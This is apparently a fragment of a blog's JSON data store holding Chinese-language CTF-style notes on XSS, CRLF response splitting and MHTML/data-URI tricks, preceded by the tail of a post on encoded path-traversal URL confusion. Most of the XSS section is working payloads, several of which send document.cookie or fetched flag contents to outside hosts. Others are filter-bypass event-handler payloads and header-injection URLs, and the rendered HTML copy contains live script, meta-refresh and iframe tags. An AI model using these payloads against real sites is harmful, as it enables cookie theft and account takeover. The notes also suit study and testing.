http://39.107.33.96:20000/index.php/view/article/1152/..%2f..%2f..%2f..%2findex.php\"></a>当前url: <a href=\"http://39.107.33.96:20000/index.php/view/article/1152/..%2f..%2f..%2f..%2findex.php\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152/..%2f..%2f..%2f..%2findex.php</a></h5><p>对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。<br>也就是访问</p>\n<pre><code>http://39.107.33.96:20000/index.php/view/article/1152/../../../../index.php\n=&gt;\nhttp://39.107.33.96:20000/index.php\n</code></pre><p>浏览器在寻找js资源的时候，并没有对%2f进行解码，就认为<br>..%2f..%2f..%2f..%2findex.php这一坨是一段数据，但是又没有人来接收这段数据，相当于报废。<br>就好比输入url-<a href=\"https://www.baidu.com?id=1，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递\" target=\"_blank\" rel=\"noopener\">https://www.baidu.com?id=1，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递</a></p>\n<p>js的路径：</p>\n<pre><code>&lt;script src=&quot;/static/js/jquery.min.js&quot;&gt;&lt;/script&gt;\n解析之后:\nhttp://39.107.33.96:20000/static/js/jquery.min.js\n</code></pre><pre><code>&lt;script src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;\n解析之后:\nhttp://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\n</code></pre><p>采用相对路径引入js:<br>当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，</p>\n<p>读到..%2f..%2f..%2f..%2findex.php这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是<a href=\"http://39.107.33.96:20000/index.php/view/article/1152\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152</a><br>也就是url:</p>\n<pre><code>http://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\n</code></pre><p>返回的内容就是:</p>\n<pre><code>http://39.107.33.96:20000/index.php/view/article/1152\n</code></pre><p>中返回的内容</p>\n"},{"title":"xss","date":"2018-03-27T08:27:13.000Z","_content":"link 标签引入外部 js。\n\n```javascript\n也可以用域名，将 . 用 。 代替。\n<link rel=import href=\\\\八进制ip\n```\n\n```javascript\n<script>\n  var xhr = new XMLHttpRequest();\n  xhr.open(\"GET\", \"https://router.vip/flag.php\", false);\n  xhr.send();\n  a=xhr.responseText;\n  location.href='https://master.xbfzss.cn/?a='+escape(a);\n</script>\n```\n\nxss:\njquery版本>=1.9\nsourceMappingURL加载外部资源\n<script>//# sourceMappingURL=https://xxx.com/?${escape(document.cookie)}</script>\n\n```\n<input name=keyword  value=\"<scrilpt>alert(1);</script>\">\npayload:\" onmouseover=alert(1) \"\n<input name=keyword  value=\"\" onmouseover=alert(1) \"\">\n```\n\n```\n<input name=keyword  value=''>\npayload:' onmouseover=alert(1) '\n<input name=keyword  value=' onmouseover=alert(1) ''>\n```\n\n```\n<input name=keyword  value=\"\">\n过滤了on\n<input name=keyword  value=\"\" o_nclick=alert(1) \"\">\n\npayload:\"><a href=\"javascript:alert(1)\" >as</a>\n<input name=keyword  value=\"\"><a href=\"javascript:alert(1)\" ></a>\">\n```\n```\n<input name=keyword  value=\"\">\n过滤了on\n<input name=keyword  value=\"\" o_nclick=alert(1) \"\">\n\npayload:\"><a href=\"javascript:alert(1)\" >as</a>\n<input name=keyword  value=\"\"><a href=\"javascript:alert(1)\" ></a>\">\n```\n\n空格可以使用%0a，%0d绕过\n\n= onmouseover=alert\\`1\\`\nalert(1)   两边的括号可以使用``替换\n\n```\n<html>\n<script type=\"text/javascript\">\nvar call_window;\ncall_window = window.open(\"http://localhost/call.php\");\nsetTimeout(function(){\n    call_window.postMessage({\n      type: \"audio\",\n      details: {\n      sender_username: \"<img src=xx: onerror=window.open('http://123.207.90.143/index.php?a='+document.cookie)>\",\n        sender_team_name: \"zzzz\",\n        receiver_username: \"test\",\n        receiver_team_name: \"test\"\n      }\n    }, \"*\");\n}, 1000);\n</script>\n</html>\n```\n\n## CRLF 注射攻击（HTTP ResponseSplitting）(HRS)\n\n``` .aspx\nnameValueCollection request = Request.QueryString;\nResponse.Cookies[\"username\"].Value = request[\"text\"]\n```\n\n正常访问:\n\n> http://www.test.com/demo.aspx?text=test\n\n正常情况下，会使用text=test来setcookie\n\npayload:\n\n> http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked\n\n正常情况下：HTTP Response如下:\n\n> HTTP/1.1 200 OK\n>\n> Set-Cookie: userName=test\n>\n> Content-Type: text/html; charset-utf-8\n\n使用payload的情况下:\n\n> HTTP/1.1 200 OK\n>\n> Set-Cookie: username=a\n>\n> Set-Cookie: HackedCookie=Hacked\n>\n> Content-Type: text/html; charset-utf8\n\n更严重的情况下:\n\npayload:\n\n> http://www.test.com/page.php?page=%0d%0aContent-Type: text/html%0D%0AHTTP/1.1 200 OK %0D%0AContent-Type: text/html%0D%0A%0D%0A%3Chtml%3EHacker Content%3C/html%3E\n\n该代码明显恶意，但是浏览器也会执行。\n\n## MHTML协议安全[IE浏览器]\n\nMHTML协议格式:\n\n> mhtml: [Mhtml_File_Url]![Original_Resource_Url]\n\n新建一个HTML文件，demo.html\n\n```html\nContent-Type: multipart/related; boundary=\"_boundary_by_mere\"\n\n--_boundary_by_mere\nCotent-Location: demo\nContent-Transfer-Encoding: base64\n\nPHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ=\n--_boundary_by_mere--\n```\n\n当使用如下链接进行访问的时候，就会弹窗：\n\n> mhtml:http://127.0.0.1/demo.html!demo\n\n注意:为了让IE调用MHTML Protocol Handler将该资源当做MHTML格式文件解析处理，需要把URL修改为MHTML协议，在\"http\"之前加上\"mhtml:\"，在url后边加上\"!demo\"字样。\n\n此外，还可以结合CRLF漏洞实现XSS。\n\n首先PHP脚本如下(test.php):\n\n```php\n<?php\n    echo $_GET['k'];\n?>\n```\n\n构造url:\n\n> mhtml:http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss\n\n## 利用Data URIs进行XSS\n\n该方案和MHTML有些类似。Data URI格式如下:\n\n>  data:\\[<mime type>\\]\\[;charset=<charset>\\]\\[;base64\\],<encoded data>\n\n> data指代URI协议\n>\n> mime type 代表数据类型，如PNG图片则为image/png,若无说明，默认为text/plain\n>\n> charset 如果不适用base64，则使用charset指定的字符类型\n>\n> encoded data 对应的编码信息\n\n例如:\n\n```html\n<img src=\"data:image/gif;base64,R0lGODlhMwAxAIAAAAAAAP///\nyH5BAAAAAAALAAAAAAzADEAAAK8jI+pBr0PowytzotTtbm/DTqQ6C3hGX\nElcraA9jIr66ozVpM3nseUvYP1UEHF0FUUHkNJxhLZfEJNvol06tzwrgd\nLbXsFZYmSMPnHLB+zNJFbq15+SOf50+6rG7lKOjwV1ibGdhHYRVYVJ9Wn\nk2HWtLdIWMSH9lfyODZoZTb4xdnpxQSEF9oyOWIqp6gaI9pI1Qo7BijbF\nZkoaAtEeiiLeKn72xM7vMZofJy8zJys2UxsCT3kO229LH1tXAAAOw==\">\n```\n\nXSS隐患，执行XSS最常用的方法是引入<script>标签，如果过滤，就没有办法使用了。\n\n> \\<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"\\>test\\</a\\>\n\n其中:\n\n> PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\n\n解码后:\n\n> \\<script\\>alert('xss');\\</script\\>\n\n这种方法，现在不支持，同样不支持的还有<meta>标签，  chrome和firefox都会禁止。  \n\n>  <meta http-equiv=\"Refresh\" content=\"0; URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\">\n\n<object>则可以使用,<iframe>也行。\n\n> <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></object>\n>\n> <iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></iframe>\n\n## simple xss\n\nXSS payload只允许使用大小写字母数字加上`<^*~\\-|_=+`这些特殊符号，那么大概只有两种方案：\n\n1. 利用onload=A=B 可以作一句给A(通常是location)赋值B的简单js赋值操作\n2. 利用某些奇怪的HTML标签特性\n\n比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某`LC↯BC`队<https://ctftime.org/writeup/5956> 脑洞出来了个奇葩思路\n\n><svg id=\\ onload=location=id+id+12345609861+domain+id+1234+id \n\n我们（nao）想（dong）出来的payload有如下几个关键点：\n\n1. Chrome会把域名中的`。`（全角句号）理解成`.`\n2. `<link rel=import`这种标签会把html import到当前页面里....N年前玩polymer的时候常用的一种标签...这里不能用script标签，因为script标签没有正常闭合时引用的js貌似不会被执行\n3. `\\\\`会被Chrome理解成`//`，`\\`也会理解成`/` （其实这里有个小插曲，我Win10上的Chrome会把`\\\\`理解成windows资源管理器里敲的那种`\\\\`也就是samba协议(或`file://`伪协议)...所以这种payload XSS Windows貌似是不行...?）， 因此`\\\\example。com\\xssHtml`会变成`//example.com/xssHtml`\n\n综上，payload:\n\n> <link rel=import href=\\\\example。com\\xssHtml other= \n\n## RSS中的XSS\n\n略\n\n## 浏览器差异\n\n```html\n<script type=\"text/javascript\"><!--\n    var x = \"xssed</script x\\><script x\\>alert(/xss/);//\";\n//--></script>\n```\n\nChrome会动态修正一些节点，如将</script x\\>修正为</script>，由于该特性只是按照标签配对，没有考虑HTML注释或其他复杂情况，会导致xss.\n\n## img编码绕过\n\n```html\n<img src=\"\" onerror=\"j&#00097vascript:alert('xss');\">\n<img src=\"\" onerror=\"j&#97vascript:alert('xss1');\">\n<img src=\"\" onerror=\" javascript:alert('xss3');\">\n```\n\n## a绕过\n\n```\n\"><a href=\"javascript:alert(1)\">click me</a><\"\n```\n\n## body和div\n\n```\n\"><body onload=alert(1)><\"\n\"><div onclick=\"alert('xss')\">click me<\"\n```\n\n\n\n##  危险字符\n\n| <    | &lt          |\n| ---- | ------------ |\n| >    | ```&gt;```   |\n| &    | ```&amp;```  |\n| \"    | ```&quot;``` |\n| '    | ```&#39```   |\n\n## Dom-Based XSS\n\n> document.URL\n>\n> document.URLUencoded\n>\n> document.location(.pathname|.href|.search|.hash)\n>\n> window.location(.pathname|.href|.search|.hash)\n>\n> document.referrer\n>\n> window.name\n>\n> document.cookie\n>\n> HTML5 postMessage\n>\n> localStorage/globalStorage\n>\n> XMLHTTPRequest response\n>\n> Input.value\n\n","source":"_posts/xss.md","raw":"---\ntitle: xss\ndate: 2018-03-27 16:27:13\ntags:\n---\nlink 标签引入外部 js。\n\n```javascript\n也可以用域名，将 . 用 。 代替。\n<link rel=import href=\\\\八进制ip\n```\n\n```javascript\n<script>\n  var xhr = new XMLHttpRequest();\n  xhr.open(\"GET\", \"https://router.vip/flag.php\", false);\n  xhr.send();\n  a=xhr.responseText;\n  location.href='https://master.xbfzss.cn/?a='+escape(a);\n</script>\n```\n\nxss:\njquery版本>=1.9\nsourceMappingURL加载外部资源\n<script>//# sourceMappingURL=https://xxx.com/?${escape(document.cookie)}</script>\n\n```\n<input name=keyword  value=\"<scrilpt>alert(1);</script>\">\npayload:\" onmouseover=alert(1) \"\n<input name=keyword  value=\"\" onmouseover=alert(1) \"\">\n```\n\n```\n<input name=keyword  value=''>\npayload:' onmouseover=alert(1) '\n<input name=keyword  value=' onmouseover=alert(1) ''>\n```\n\n```\n<input name=keyword  value=\"\">\n过滤了on\n<input name=keyword  value=\"\" o_nclick=alert(1) \"\">\n\npayload:\"><a href=\"javascript:alert(1)\" >as</a>\n<input name=keyword  value=\"\"><a href=\"javascript:alert(1)\" ></a>\">\n```\n```\n<input name=keyword  value=\"\">\n过滤了on\n<input name=keyword  value=\"\" o_nclick=alert(1) \"\">\n\npayload:\"><a href=\"javascript:alert(1)\" >as</a>\n<input name=keyword  value=\"\"><a href=\"javascript:alert(1)\" ></a>\">\n```\n\n空格可以使用%0a，%0d绕过\n\n= onmouseover=alert\\`1\\`\nalert(1)   两边的括号可以使用``替换\n\n```\n<html>\n<script type=\"text/javascript\">\nvar call_window;\ncall_window = window.open(\"http://localhost/call.php\");\nsetTimeout(function(){\n    call_window.postMessage({\n      type: \"audio\",\n      details: {\n      sender_username: \"<img src=xx: onerror=window.open('http://123.207.90.143/index.php?a='+document.cookie)>\",\n        sender_team_name: \"zzzz\",\n        receiver_username: \"test\",\n        receiver_team_name: \"test\"\n      }\n    }, \"*\");\n}, 1000);\n</script>\n</html>\n```\n\n## CRLF 注射攻击（HTTP ResponseSplitting）(HRS)\n\n``` .aspx\nnameValueCollection request = Request.QueryString;\nResponse.Cookies[\"username\"].Value = request[\"text\"]\n```\n\n正常访问:\n\n> http://www.test.com/demo.aspx?text=test\n\n正常情况下，会使用text=test来setcookie\n\npayload:\n\n> http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked\n\n正常情况下：HTTP Response如下:\n\n> HTTP/1.1 200 OK\n>\n> Set-Cookie: userName=test\n>\n> Content-Type: text/html; charset-utf-8\n\n使用payload的情况下:\n\n> HTTP/1.1 200 OK\n>\n> Set-Cookie: username=a\n>\n> Set-Cookie: HackedCookie=Hacked\n>\n> Content-Type: text/html; charset-utf8\n\n更严重的情况下:\n\npayload:\n\n> http://www.test.com/page.php?page=%0d%0aContent-Type: text/html%0D%0AHTTP/1.1 200 OK %0D%0AContent-Type: text/html%0D%0A%0D%0A%3Chtml%3EHacker Content%3C/html%3E\n\n该代码明显恶意，但是浏览器也会执行。\n\n## MHTML协议安全[IE浏览器]\n\nMHTML协议格式:\n\n> mhtml: [Mhtml_File_Url]![Original_Resource_Url]\n\n新建一个HTML文件，demo.html\n\n```html\nContent-Type: multipart/related; boundary=\"_boundary_by_mere\"\n\n--_boundary_by_mere\nCotent-Location: demo\nContent-Transfer-Encoding: base64\n\nPHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ=\n--_boundary_by_mere--\n```\n\n当使用如下链接进行访问的时候，就会弹窗：\n\n> mhtml:http://127.0.0.1/demo.html!demo\n\n注意:为了让IE调用MHTML Protocol Handler将该资源当做MHTML格式文件解析处理，需要把URL修改为MHTML协议，在\"http\"之前加上\"mhtml:\"，在url后边加上\"!demo\"字样。\n\n此外，还可以结合CRLF漏洞实现XSS。\n\n首先PHP脚本如下(test.php):\n\n```php\n<?php\n    echo $_GET['k'];\n?>\n```\n\n构造url:\n\n> mhtml:http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss\n\n## 利用Data URIs进行XSS\n\n该方案和MHTML有些类似。Data URI格式如下:\n\n>  data:\\[<mime type>\\]\\[;charset=<charset>\\]\\[;base64\\],<encoded data>\n\n> data指代URI协议\n>\n> mime type 代表数据类型，如PNG图片则为image/png,若无说明，默认为text/plain\n>\n> charset 如果不适用base64，则使用charset指定的字符类型\n>\n> encoded data 对应的编码信息\n\n例如:\n\n```html\n<img src=\"data:image/gif;base64,R0lGODlhMwAxAIAAAAAAAP///\nyH5BAAAAAAALAAAAAAzADEAAAK8jI+pBr0PowytzotTtbm/DTqQ6C3hGX\nElcraA9jIr66ozVpM3nseUvYP1UEHF0FUUHkNJxhLZfEJNvol06tzwrgd\nLbXsFZYmSMPnHLB+zNJFbq15+SOf50+6rG7lKOjwV1ibGdhHYRVYVJ9Wn\nk2HWtLdIWMSH9lfyODZoZTb4xdnpxQSEF9oyOWIqp6gaI9pI1Qo7BijbF\nZkoaAtEeiiLeKn72xM7vMZofJy8zJys2UxsCT3kO229LH1tXAAAOw==\">\n```\n\nXSS隐患，执行XSS最常用的方法是引入<script>标签，如果过滤，就没有办法使用了。\n\n> \\<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"\\>test\\</a\\>\n\n其中:\n\n> PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\n\n解码后:\n\n> \\<script\\>alert('xss');\\</script\\>\n\n这种方法，现在不支持，同样不支持的还有<meta>标签，  chrome和firefox都会禁止。  \n\n>  <meta http-equiv=\"Refresh\" content=\"0; URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\">\n\n<object>则可以使用,<iframe>也行。\n\n> <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></object>\n>\n> <iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></iframe>\n\n## simple xss\n\nXSS payload只允许使用大小写字母数字加上`<^*~\\-|_=+`这些特殊符号，那么大概只有两种方案：\n\n1. 利用onload=A=B 可以作一句给A(通常是location)赋值B的简单js赋值操作\n2. 利用某些奇怪的HTML标签特性\n\n比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某`LC↯BC`队<https://ctftime.org/writeup/5956> 脑洞出来了个奇葩思路\n\n><svg id=\\ onload=location=id+id+12345609861+domain+id+1234+id \n\n我们（nao）想（dong）出来的payload有如下几个关键点：\n\n1. Chrome会把域名中的`。`（全角句号）理解成`.`\n2. `<link rel=import`这种标签会把html import到当前页面里....N年前玩polymer的时候常用的一种标签...这里不能用script标签，因为script标签没有正常闭合时引用的js貌似不会被执行\n3. `\\\\`会被Chrome理解成`//`，`\\`也会理解成`/` （其实这里有个小插曲，我Win10上的Chrome会把`\\\\`理解成windows资源管理器里敲的那种`\\\\`也就是samba协议(或`file://`伪协议)...所以这种payload XSS Windows貌似是不行...?）， 因此`\\\\example。com\\xssHtml`会变成`//example.com/xssHtml`\n\n综上，payload:\n\n> <link rel=import href=\\\\example。com\\xssHtml other= \n\n## RSS中的XSS\n\n略\n\n## 浏览器差异\n\n```html\n<script type=\"text/javascript\"><!--\n    var x = \"xssed</script x\\><script x\\>alert(/xss/);//\";\n//--></script>\n```\n\nChrome会动态修正一些节点，如将</script x\\>修正为</script>，由于该特性只是按照标签配对，没有考虑HTML注释或其他复杂情况，会导致xss.\n\n## img编码绕过\n\n```html\n<img src=\"\" onerror=\"j&#00097vascript:alert('xss');\">\n<img src=\"\" onerror=\"j&#97vascript:alert('xss1');\">\n<img src=\"\" onerror=\" javascript:alert('xss3');\">\n```\n\n## a绕过\n\n```\n\"><a href=\"javascript:alert(1)\">click me</a><\"\n```\n\n## body和div\n\n```\n\"><body onload=alert(1)><\"\n\"><div onclick=\"alert('xss')\">click me<\"\n```\n\n\n\n##  危险字符\n\n| <    | &lt          |\n| ---- | ------------ |\n| >    | ```&gt;```   |\n| &    | ```&amp;```  |\n| \"    | ```&quot;``` |\n| '    | ```&#39```   |\n\n## Dom-Based XSS\n\n> document.URL\n>\n> document.URLUencoded\n>\n> document.location(.pathname|.href|.search|.hash)\n>\n> window.location(.pathname|.href|.search|.hash)\n>\n> document.referrer\n>\n> window.name\n>\n> document.cookie\n>\n> HTML5 postMessage\n>\n> localStorage/globalStorage\n>\n> XMLHTTPRequest response\n>\n> Input.value\n\n","slug":"xss","published":1,"updated":"2018-06-22T03:31:23.955Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jq30018ly4jbdwjz7j0","content":"<p>link 标签引入外部 js。</p>\n<pre><code class=\"javascript\">也可以用域名，将 . 用 。 代替。\n&lt;link rel=import href=\\\\八进制ip\n</code></pre>\n<pre><code class=\"javascript\">&lt;script&gt;\n  var xhr = new XMLHttpRequest();\n  xhr.open(&quot;GET&quot;, &quot;https://router.vip/flag.php&quot;, false);\n  xhr.send();\n  a=xhr.responseText;\n  location.href=&#39;https://master.xbfzss.cn/?a=&#39;+escape(a);\n&lt;/script&gt;\n</code></pre>\n<p>xss:<br>jquery版本&gt;=1.9<br>sourceMappingURL加载外部资源</p>\n<script>//# sourceMappingURL=https://xxx.com/?${escape(document.cookie)}</script>\n\n<pre><code>&lt;input name=keyword  value=&quot;&lt;scrilpt&gt;alert(1);&lt;/script&gt;&quot;&gt;\npayload:&quot; onmouseover=alert(1) &quot;\n&lt;input name=keyword  value=&quot;&quot; onmouseover=alert(1) &quot;&quot;&gt;\n</code></pre><pre><code>&lt;input name=keyword  value=&#39;&#39;&gt;\npayload:&#39; onmouseover=alert(1) &#39;\n&lt;input name=keyword  value=&#39; onmouseover=alert(1) &#39;&#39;&gt;\n</code></pre><pre><code>&lt;input name=keyword  value=&quot;&quot;&gt;\n过滤了on\n&lt;input name=keyword  value=&quot;&quot; o_nclick=alert(1) &quot;&quot;&gt;\n\npayload:&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;as&lt;/a&gt;\n&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;&lt;/a&gt;&quot;&gt;\n</code></pre><pre><code>&lt;input name=keyword  value=&quot;&quot;&gt;\n过滤了on\n&lt;input name=keyword  value=&quot;&quot; o_nclick=alert(1) &quot;&quot;&gt;\n\npayload:&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;as&lt;/a&gt;\n&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; &gt;&lt;/a&gt;&quot;&gt;\n</code></pre><p>空格可以使用%0a，%0d绕过</p>\n<p>= onmouseover=alert`1`<br>alert(1)   两边的括号可以使用``替换</p>\n<pre><code>&lt;html&gt;\n&lt;script type=&quot;text/javascript&quot;&gt;\nvar call_window;\ncall_window = window.open(&quot;http://localhost/call.php&quot;);\nsetTimeout(function(){\n    call_window.postMessage({\n      type: &quot;audio&quot;,\n      details: {\n      sender_username: &quot;&lt;img src=xx: onerror=window.open(&#39;http://123.207.90.143/index.php?a=&#39;+document.cookie)&gt;&quot;,\n        sender_team_name: &quot;zzzz&quot;,\n        receiver_username: &quot;test&quot;,\n        receiver_team_name: &quot;test&quot;\n      }\n    }, &quot;*&quot;);\n}, 1000);\n&lt;/script&gt;\n&lt;/html&gt;\n</code></pre><h2 id=\"CRLF-注射攻击（HTTP-ResponseSplitting）-HRS\"><a href=\"#CRLF-注射攻击（HTTP-ResponseSplitting）-HRS\" class=\"headerlink\" title=\"CRLF 注射攻击（HTTP ResponseSplitting）(HRS)\"></a>CRLF 注射攻击（HTTP ResponseSplitting）(HRS)</h2><pre><code class=\"aspx\">nameValueCollection request = Request.QueryString;\nResponse.Cookies[&quot;username&quot;].Value = request[&quot;text&quot;]\n</code></pre>\n<p>正常访问:</p>\n<blockquote>\n<p><a href=\"http://www.test.com/demo.aspx?text=test\" target=\"_blank\" rel=\"noopener\">http://www.test.com/demo.aspx?text=test</a></p>\n</blockquote>\n<p>正常情况下，会使用text=test来setcookie</p>\n<p>payload:</p>\n<blockquote>\n<p><a href=\"http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked\" target=\"_blank\" rel=\"noopener\">http://www.test.com/demo.aspx?text=a%0D%0ASet-Cookie%03A020HackedCookie=Hacked</a></p>\n</blockquote>\n<p>正常情况下：HTTP Response如下:</p>\n<blockquote>\n<p>HTTP/1.1 200 OK</p>\n<p>Set-Cookie: userName=test</p>\n<p>Content-Type: text/html; charset-utf-8</p>\n</blockquote>\n<p>使用payload的情况下:</p>\n<blockquote>\n<p>HTTP/1.1 200 OK</p>\n<p>Set-Cookie: username=a</p>\n<p>Set-Cookie: HackedCookie=Hacked</p>\n<p>Content-Type: text/html; charset-utf8</p>\n</blockquote>\n<p>更严重的情况下:</p>\n<p>payload:</p>\n<blockquote>\n<p><a href=\"http://www.test.com/page.php?page=%0d%0aContent-Type\" target=\"_blank\" rel=\"noopener\">http://www.test.com/page.php?page=%0d%0aContent-Type</a>: text/html%0D%0AHTTP/1.1 200 OK %0D%0AContent-Type: text/html%0D%0A%0D%0A%3Chtml%3EHacker Content%3C/html%3E</p>\n</blockquote>\n<p>该代码明显恶意，但是浏览器也会执行。</p>\n<h2 id=\"MHTML协议安全-IE浏览器\"><a href=\"#MHTML协议安全-IE浏览器\" class=\"headerlink\" title=\"MHTML协议安全[IE浏览器]\"></a>MHTML协议安全[IE浏览器]</h2><p>MHTML协议格式:</p>\n<blockquote>\n<p>mhtml: [Mhtml_File_Url]![Original_Resource_Url]</p>\n</blockquote>\n<p>新建一个HTML文件，demo.html</p>\n<pre><code class=\"html\">Content-Type: multipart/related; boundary=&quot;_boundary_by_mere&quot;\n\n--_boundary_by_mere\nCotent-Location: demo\nContent-Transfer-Encoding: base64\n\nPHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ=\n--_boundary_by_mere--\n</code></pre>\n<p>当使用如下链接进行访问的时候，就会弹窗：</p>\n<blockquote>\n<p>mhtml:<a href=\"http://127.0.0.1/demo.html!demo\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/demo.html!demo</a></p>\n</blockquote>\n<p>注意:为了让IE调用MHTML Protocol Handler将该资源当做MHTML格式文件解析处理，需要把URL修改为MHTML协议，在”http”之前加上”mhtml:”，在url后边加上”!demo”字样。</p>\n<p>此外，还可以结合CRLF漏洞实现XSS。</p>\n<p>首先PHP脚本如下(test.php):</p>\n<pre><code class=\"php\">&lt;?php\n    echo $_GET[&#39;k&#39;];\n?&gt;\n</code></pre>\n<p>构造url:</p>\n<blockquote>\n<p>mhtml:<a href=\"http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/test.php?k=ax%250AContent-Type%3A%20multipart%2frelated%3B%20boundary%3D%22_boundary_by_mere%22%250D%250A--_boundary_by_mere%250D%250ACotent-Location%3A%20xss%250D%250AContent-Transfer-Encoding%3A%20base64%250D%250A%250D%250APHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ%3D%250D%250A--_boundary_by_mere--!xss</a></p>\n</blockquote>\n<h2 id=\"利用Data-URIs进行XSS\"><a href=\"#利用Data-URIs进行XSS\" class=\"headerlink\" title=\"利用Data URIs进行XSS\"></a>利用Data URIs进行XSS</h2><p>该方案和MHTML有些类似。Data URI格式如下:</p>\n<blockquote>\n<p> data:[<mime type=\"\">][;charset=<charset>][;base64],<encoded data=\"\"></encoded></charset></mime></p>\n<p>data指代URI协议</p>\n<p>mime type 代表数据类型，如PNG图片则为image/png,若无说明，默认为text/plain</p>\n<p>charset 如果不适用base64，则使用charset指定的字符类型</p>\n<p>encoded data 对应的编码信息</p>\n</blockquote>\n<p>例如:</p>\n<pre><code class=\"html\">&lt;img src=&quot;data:image/gif;base64,R0lGODlhMwAxAIAAAAAAAP///\nyH5BAAAAAAALAAAAAAzADEAAAK8jI+pBr0PowytzotTtbm/DTqQ6C3hGX\nElcraA9jIr66ozVpM3nseUvYP1UEHF0FUUHkNJxhLZfEJNvol06tzwrgd\nLbXsFZYmSMPnHLB+zNJFbq15+SOf50+6rG7lKOjwV1ibGdhHYRVYVJ9Wn\nk2HWtLdIWMSH9lfyODZoZTb4xdnpxQSEF9oyOWIqp6gaI9pI1Qo7BijbF\nZkoaAtEeiiLeKn72xM7vMZofJy8zJys2UxsCT3kO229LH1tXAAAOw==&quot;&gt;\n</code></pre>\n<p>XSS隐患，执行XSS最常用的方法是引入<script>标签，如果过滤，就没有办法使用了。</p>\n<blockquote>\n<p>\\<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"\\>test\\</a\\></p>\n</blockquote>\n<p>其中:</p>\n<blockquote>\n<p>PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+</p>\n</blockquote>\n<p>解码后:</p>\n<blockquote>\n<p>\\<script\\>alert(‘xss’);\\</script\\></p>\n</blockquote>\n<p>这种方法，现在不支持，同样不支持的还有<meta>标签，  chrome和firefox都会禁止。  </p>\n<blockquote>\n <meta http-equiv=\"Refresh\" content=\"0; URL=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\">\n\n</blockquote>\n<p><object>则可以使用,<iframe>也行。</p>\n<blockquote>\n<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></object>\n\n<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+\"></iframe>\n\n</blockquote>\n<h2 id=\"simple-xss\"><a href=\"#simple-xss\" class=\"headerlink\" title=\"simple xss\"></a>simple xss</h2><p>XSS payload只允许使用大小写字母数字加上<code>&lt;^*~\\-|_=+</code>这些特殊符号，那么大概只有两种方案：</p>\n<ol>\n<li>利用onload=A=B 